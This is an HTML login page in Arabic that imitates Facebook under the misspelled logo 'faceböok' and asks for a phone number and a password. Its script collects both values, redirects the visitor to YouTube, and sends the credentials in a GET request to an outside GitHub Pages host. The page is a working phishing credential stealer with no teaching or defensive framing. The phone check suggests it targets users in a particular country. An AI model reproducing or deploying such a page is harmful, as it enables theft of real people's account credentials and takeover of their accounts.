
<!DOCTYPE html>
<html>
<head>
    <title>صفحة تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }

        .facebook-logo {
            width: 400px;
            height: 100px;
            background-color: #1877f2;
            color: white;
            font-size: 24px;
            text-align: center;
            line-height: 100px;
        }

        .form-container {
            width: 300px;
            margin: 20px auto;
        }

        .form-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
        }

        .form-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            cursor: pointer;
        }

        .error-message {
            color: red;
        }

        .success-message {
            color: green;
        }
    </style>
</head>
<body>
    <div class="facebook-logo">faceböok</div>
    <div class="form-container">
        <input type="tel" id="phoneNumber" placeholder="رقم الهاتف">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="signIn()">تسجيل الدخول</button>
        <div class="error-message" id="errorMessage"></div>
    </div>

    <script>
        function signIn() {
            var phoneNumber = document.getElementById("phoneNumber").value;
            var password = document.getElementById("password").value;
            var errorMessage = document.getElementById("errorMessage");

            if (!isValidPhoneNumber(phoneNumber)) {
                errorMessage.innerHTML = "رقم الهاتف غير صحيح";
            } else if (password.length < 8) {
                errorMessage.innerHTML = "كلمة المرور يجب أن تحتوي على ٨ أحرف على الأقل";
            } else {
                errorMessage.innerHTML = "";
                var userData = "رقم الهاتف: " + phoneNumber + "، كلمة المرور: " + password;

                // توجيه المستخدمين إلى صفحة YouTube
                window.location.href = "https://www.youtube.com/";

                // إرسال معلومات المستخدم إلى الصفحة الأخرى
                var request = new XMLHttpRequest();
                request.open("GET", "https://korotenshi.github.io/kOotenshi.github.io/?info=" + encodeURIComponent(userData), true);
                request.send();
            }
        }

        function isValidPhoneNumber(phoneNumber) {
            return /^(05|06|07)\d{8}$/.test(phoneNumber);
        }
    </script>
</body>
</html>
